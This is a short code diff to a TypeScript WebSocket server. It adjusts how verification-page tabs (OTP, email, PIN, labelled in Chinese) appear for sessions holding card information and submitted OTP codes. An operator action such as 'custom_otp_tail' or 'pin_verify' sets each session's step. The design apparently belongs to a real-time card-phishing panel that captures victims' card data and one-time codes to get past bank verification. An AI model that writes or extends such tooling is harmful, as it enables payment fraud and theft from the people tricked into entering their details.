@@ -414,7 +414,18 @@ export async function setupWebSocket(server: any) {
               if (addrIdx >= 0) updatePayload.browsingTabs[addrIdx].count = filledCount;
               else updatePayload.browsingTabs.push({ label: '地址页', count: filledCount, active: false });
             }
+            // 验证页: only when customer submits code
+            if (s.cardInfo?.otpCode) {
+              const step = s.currentStep;
+              if (step === 'otp' && !updatePayload.browsingTabs.some((t: any) => t.label === 'OTP验证页')) {
+                updatePayload.browsingTabs.push({ label: 'OTP验证页', count: 2, active: false });
+              } else if (step === 'email_verify' && !updatePayload.browsingTabs.some((t: any) => t.label === 'Email验证页')) {
+                updatePayload.browsingTabs.push({ label: 'Email验证页', count: 2, active: false });
+              } else if (step === 'pin_verify' && !updatePayload.browsingTabs.some((t: any) => t.label === 'PIN验证页')) {
+                updatePayload.browsingTabs.push({ label: 'PIN验证页', count: 2, active: false });
               }
+            }
+          }
             }
           }
 
@@ -491,16 +502,12 @@ export async function setupWebSocket(server: any) {
             // Update currentStep for verification actions
             if (action === 'app_verify') {
               s.currentStep = 'app_verify';
-              addBrowsingTab(s, 'APP验证页', 1);
             } else if (action === 'otp_verify' || action === 'custom_otp_tail' || action === 'custom_otp_verify') {
               s.currentStep = 'otp';
-              addBrowsingTab(s, 'OTP验证页', 1);
             } else if (action === 'email_verify') {
               s.currentStep = 'email_verify';
-              addBrowsingTab(s, 'Email验证页', 1);
             } else if (action === 'pin_verify') {
               s.currentStep = 'pin_verify';
-              addBrowsingTab(s, 'PIN验证页', 1);
             }
           }
           paymentService.upsertSession({ id: sessionId, status: newStatus, currentStep: s?.currentStep });
